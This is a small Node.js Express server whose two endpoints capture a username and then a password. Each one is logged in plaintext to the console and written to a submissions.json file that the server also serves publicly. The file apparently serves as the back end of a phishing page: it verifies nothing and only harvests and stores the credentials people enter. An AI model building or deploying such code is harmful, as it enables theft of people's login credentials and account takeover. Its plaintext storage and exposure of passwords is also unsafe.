const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

const submissionsFile = path.join(__dirname, 'submissions.json');

// Ensure submissions.json exists
if (!fs.existsSync(submissionsFile)) {
  fs.writeFileSync(submissionsFile, JSON.stringify([]));
  console.log("Created new submissions.json file");
}

// Save username
app.post('/submit-username', (req, res) => {
  const { username } = req.body;
  console.log("Received username:", username);

  let data = [];
  try {
    data = JSON.parse(fs.readFileSync(submissionsFile));
  } catch (err) {
    data = [];
  }

  data.push({ username, password: null, timestamp: new Date().toISOString() });

  fs.writeFileSync(submissionsFile, JSON.stringify(data, null, 2));
  res.sendStatus(200);
});

// Save password
app.post('/submit-password', (req, res) => {
  const { password } = req.body;
  console.log("Received password:", password);

  let data = [];
  try {
    data = JSON.parse(fs.readFileSync(submissionsFile));
  } catch (err) {
    data = [];
  }

  if (data.length > 0 && data[data.length - 1].password === null) {
    data[data.length - 1].password = password;
    fs.writeFileSync(submissionsFile, JSON.stringify(data, null, 2));
  }

  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
